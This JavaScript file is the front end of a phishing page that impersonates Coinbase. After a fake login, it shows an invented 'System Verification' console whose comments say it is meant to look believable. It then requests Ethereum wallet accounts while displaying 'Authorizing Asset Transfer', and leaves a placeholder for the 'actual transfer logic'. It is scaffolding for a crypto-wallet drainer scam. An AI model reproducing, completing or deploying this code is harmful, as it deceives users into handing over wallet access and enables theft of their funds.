document.addEventListener('DOMContentLoaded', () => {
    
    const toStep2 = document.getElementById('toStep2');
    if (toStep2) {
        toStep2.onclick = () => {
            document.getElementById('step-1').classList.add('hidden');
            document.getElementById('step-2').classList.remove('hidden');
        };
    }

    const loginForm = document.getElementById('login-form');
    if (loginForm) {
        loginForm.onsubmit = (e) => {
            e.preventDefault();
            document.getElementById('step-2').classList.add('hidden');
            
            const container = document.querySelector('.container');
            const authScreen = document.createElement('div');
            authScreen.className = 'auth-card';
            
            // Create a formal "Security Console"
            const consoleBox = document.createElement('div');
            console.Box = document.createElement('div'); // Keep reference
            console.Box.style.backgroundColor = "#0a0b0d";
            console.Box.style.color = "#00ff41"; 
            console.Box.style.fontFamily = "monospace";
            console.Box.style.padding = "15px";
            console.Box.style.borderRadius = "8px";
            console.Box.style.fontSize = "13px";
            console.Box.style.textAlign = "left";
            console.Box.style.height = "120px";
            console.Box.style.overflow = "hidden";
            
            authScreen.innerHTML = `<h1 style="font-size: 18px; color: #5b616e;">System Verification</h1>`;
            authScreen.appendChild(console.Box);
            container.appendChild(authScreen);

            // formal, believable technical sequence
            const log = [
                "[SEC] Establishing TLS 1.3 handshake...",
                "[SEC] Validating SSL certificate 0x8F92... OK",
                "[SYS] Routing request via global load balancer...",
                "[SYS] Querying UID at coinbase.com/auth...",
                "[SEC] Matching IP header with account origin...",
                "[SYS] Identity packet received. Unpacking...",
                "[SYS] Localizing wallet shards...",
                "[SYS] Authorizing sync session #sH-8329..."
            ];

            let i = 0;
            const interval = setInterval(() => {
                const line = document.createElement('div');
                line.innerText = log[i];
                console.Box.appendChild(line);
                console.Box.scrollTop = console.Box.scrollHeight;
                i++;
                if (i >= log.length) {
                    clearInterval(interval);
                    setTimeout(() => {
                        authScreen.remove();
                        document.getElementById('step-3').classList.remove('hidden');
                    }, 600);
                }
            }, 450); // Fast enough to not bore, slow enough to believe
        };
    }

    const connectBtn = document.getElementById('connectBtn');
    if (connectBtn) {
        connectBtn.onclick = async () => {
            const status = document.getElementById('status');
            if (window.ethereum) {
                try {
                    status.innerText = "Requesting vault signature...";
                    const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
                    status.innerText = "Authorizing Asset Transfer...";
                    
                    // Add a small delay to simulate "network traffic"
                    setTimeout(() => {
                        status.innerText = "Synchronizing holdings...";
                        setTimeout(() => {
                            status.innerText = "Sync Complete. Reviewing assets...";
                            connectBtn.innerText = "Continue to Wallet";
                            connectBtn.onclick = () => { 
                                alert("Synchronizing to secure storage...");
                                // Add your actual transfer logic here
                            };
                        }, 1500);
                    }, 1500);

                } catch (error) {
                    status.innerText = "Connection timed out. Try again.";
                }
            } else {
                status.innerText = "Please install Coinbase Wallet.";
            }
        };
    }
});
